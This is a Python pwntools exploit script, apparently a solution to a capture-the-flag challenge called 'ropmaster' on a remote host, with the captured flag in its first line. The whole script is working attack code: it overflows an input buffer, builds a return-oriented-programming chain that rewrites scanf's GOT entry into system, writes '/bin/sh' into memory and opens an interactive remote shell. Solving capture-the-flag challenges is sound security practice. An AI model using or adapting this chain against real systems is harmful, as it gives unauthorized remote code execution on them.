# flag{1_4m_7h3_R0P_M4ster_X0X0}
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.33.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("ropmaster.payatu.co", 44443)

for i in range(0x102):
    target.sendline(str(0x41414141))

for i in range(4):
    target.sendline("+")

# 0x000000000040128a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
rbx_popper = 0x000000000040128a
pop_rdi = 0x0000000000401293
# 0x000000000040113c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
adder_gad = 0x000000000040113c
offset = 0x7f0230ec0a60 - 0x7f0230ed2060 # system - scanf
bss = 0x4040f0

def push(num):
    target.sendline(str(num & 0xffffffff))
    target.sendline(str(num >> 32))

def add_to_what(addr, what):   
    push(rbx_popper)
    push(what)
    push(addr + 0x3d)
    for i in range(4):
        push(0)
    push(adder_gad)

add_to_what(elf.got['__isoc99_scanf'], offset)
add_to_what(bss, u32("/bin"))
add_to_what(bss + 4, u32("/sh\x00"))

push(pop_rdi)
push(bss)
push(pop_rdi + 1)
push(elf.plt['__isoc99_scanf'])
push(0x424242424242)

target.sendline(str(0x13377331))

target.interactive()
